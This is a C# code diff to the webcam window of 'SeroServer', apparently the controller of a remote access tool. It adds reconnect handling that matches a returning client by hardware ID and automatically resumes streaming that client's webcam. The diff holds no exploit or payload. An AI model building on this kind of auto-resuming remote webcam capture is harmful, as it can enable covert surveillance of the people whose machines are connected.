@@ -13,7 +13,11 @@ namespace SeroServer.UI;
 public partial class WebcamWindow : Window
 {
     private readonly TlsServer _server;
-    private readonly string _clientId;
+    private string _clientId;
+    private readonly string _hwid;
+    private System.Windows.Threading.DispatcherTimer? _reconnectTimer;
+    private int _reconnectCountdown;
+    private bool _wasStreaming;
     private volatile bool _closed, _streaming;
     private int _frameCount;
     private DateTime _fpsTime = DateTime.UtcNow;
@@ -23,6 +27,7 @@ public partial class WebcamWindow : Window
     {
         _server   = server;
         _clientId = clientId;
+        _hwid     = server.ConnectedClients.TryGetValue(clientId, out var cc) ? cc.Hwid : string.Empty;
         InitializeComponent();
         WindowResizer.Enable(this);
 
@@ -41,11 +46,14 @@ public partial class WebcamWindow : Window
 
         _server.WcamFrameReceived  += OnWcamData;
         _server.ClientDisconnected += OnClientDisconnected;
+        _server.ClientConnected += OnClientConnected;
         Closed += (_, _) =>
         {
             _closed = true;
+            _reconnectTimer?.Stop();
             _server.WcamFrameReceived  -= OnWcamData;
             _server.ClientDisconnected -= OnClientDisconnected;
+            _server.ClientConnected -= OnClientConnected;
             if (_streaming) SendStop();
         };
 
@@ -325,7 +333,65 @@ public partial class WebcamWindow : Window
     private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
     {
         if (c.Id != _clientId) return;
-        Dispatcher.BeginInvoke(Close);
+        Dispatcher.BeginInvoke(() =>
+        {
+            _wasStreaming = _streaming;
+            if (_streaming) SetStreamingState(false);
+            _reconnectCountdown = 60;
+            TxtReconnectCountdown.Text = $"Reconnecting... ({_reconnectCountdown}s)";
+            ReconnectOverlay.Visibility = Visibility.Visible;
+            TxtStatus.Text = "Connection lost";
+            ServerWindow.ReportGlobalActivity("⚡ Connection lost", _clientId, "failed");
+
+            _reconnectTimer?.Stop();
+            _reconnectTimer = new System.Windows.Threading.DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
+            _reconnectTimer.Tick += (_, _) =>
+            {
+                _reconnectCountdown--;
+                TxtReconnectCountdown.Text = $"Reconnecting... ({_reconnectCountdown}s)";
+                if (_reconnectCountdown <= 0)
+                {
+                    _reconnectTimer.Stop();
+                    ServerWindow.ReportGlobalActivity("✗ Reconnect timeout", _hwid.Length > 8 ? _hwid[..8] : _hwid, "failed");
+                    Close();
+                }
+            };
+            _reconnectTimer.Start();
+        });
+    }
+
+    private void OnClientConnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (string.IsNullOrEmpty(_hwid) || c.Hwid != _hwid) return;
+        Dispatcher.BeginInvoke(() =>
+        {
+            if (_closed) return;
+            _clientId = c.Id;
+
+            // Hide overlay, cancel timer
+            _reconnectTimer?.Stop();
+            ReconnectOverlay.Visibility = Visibility.Collapsed;
+
+            // Update UI
+            TxtClientId.Text = $"[ {_clientId} ]";
+            TxtStatus.Text = "Reconnected";
+            ServerWindow.ReportGlobalActivity("✓ Reconnected (Webcam)", _clientId, "complete");
+
+            // Auto-resume streaming if it was active before disconnect
+            if (_wasStreaming)
+            {
+                _wasStreaming = false;
+                SendProbe(); // request device list first
+                // Delay slightly to let device list arrive, then start
+                var resumeTimer = new System.Windows.Threading.DispatcherTimer { Interval = TimeSpan.FromMilliseconds(1500) };
+                resumeTimer.Tick += (_, _) =>
+                {
+                    resumeTimer.Stop();
+                    if (!_closed && !_streaming) SendStart();
+                };
+                resumeTimer.Start();
+            }
+        });
     }
 
     private void ChkAutoSave_Changed(object s, RoutedEventArgs e)
